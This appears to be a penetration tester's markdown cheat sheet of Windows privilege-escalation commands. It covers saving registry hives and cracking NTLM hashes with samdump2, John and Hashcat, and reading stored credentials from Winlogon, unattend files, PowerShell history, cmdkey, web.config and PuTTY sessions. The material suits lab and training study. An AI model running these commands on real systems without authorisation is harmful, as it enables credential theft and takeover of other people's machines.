

## **Check User Permissions and Group Info (Filtered View)**

```bash
whoami /all | Select-String -Pattern "username" -Context 2,0

# example
whoami /all | Select-String -Pattern "wade" -Context 2,0
```
This command helps you **find out what groups or permissions a specific user (like `jareth`) has** on a Windows system. It searches through the detailed `whoami /all` output and shows any lines related to the user, along with 2 lines above it for extra context. Useful during **privilege escalation** to check if a user has powerful roles or tokens.

# Show folders recursive 

```bash
tree /f
```

# Dumping NTLM Hashes
#### Step 1: Save the Registry Hives
📝 Make sure you have administrative or SYSTEM privileges to run these commands.

```bash
# Stores user password hashes
reg save HKLM\SAM SAM   

# Contains the boot key used to decrypt the hashes
reg save HKLM\SYSTEM SYSTEM 

# May be used for further secrets (e.g., LSA secrets
reg save HKLM\SECURITY SECURITY 
```
#### Step 2: Extract Hashes Using `samdump2`
Once you have the `SAM` and `SYSTEM` hives, extract the hashes with: 

```
samdump2 SYSTEM SAM
```
#### Step 3: Crack the Hashes
I take the LM code of  and decode it through online site _Crackstation,_ you guys can try it with offline tools like: **_JohnTheRipper_** or **_Hashcat_**.
```bash
# _JohnTheRipper_
john --format=nt hash.txt --wordlist=rockyou.txt

#_Hashcat_
`hashcat -m 1000 hash.txt rockyou.txt`
```
## Winlogon Registry Key

---

### 📌 What is it?

The `Winlogon` registry key holds important **Windows login settings** such as:

- Auto-login username and password
- What program runs when a user logs in (like `explorer.exe`)
- Potential persistence or privilege escalation points for attackers

 Command to **Find stored plaintext credentials** (DefaultUsername/Password)

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## **Unattended Windows Installations**

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

## **Powershell History**

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

## **Saved Windows Credentials**

```bash
cmdkey /list
```

## **IIS Configuration**

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## **Retrieve Credentials from Software: PuTTY**

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

## **Scheduled Tasks**

List all scheduled tasks

```bash
schtasks 
```

 Check details about a specific task

```bash
schtasks /query /tn vulntask /fo list /v
```

Check who can modify the file

```bash
icacls c:\tasks\schtask.bat
```

## **Unpatched Software:**

```bash
wmic product get name,version,vendor
```

- **`wmic`**
    - Stands for **Windows Management Instrumentation Command-line**
    - Used to gather system info from the Windows OS via command line
- **`product`**
    - Refers to **installed software/products** on the system
- **`get`**
    - Tells WMIC to **retrieve information**
- **`name,version,vendor`**
    - Specifies the **details to display** for each installed product:
        - `name` → software name
        - `version` → version number
        - `vendor` → software developer/company name
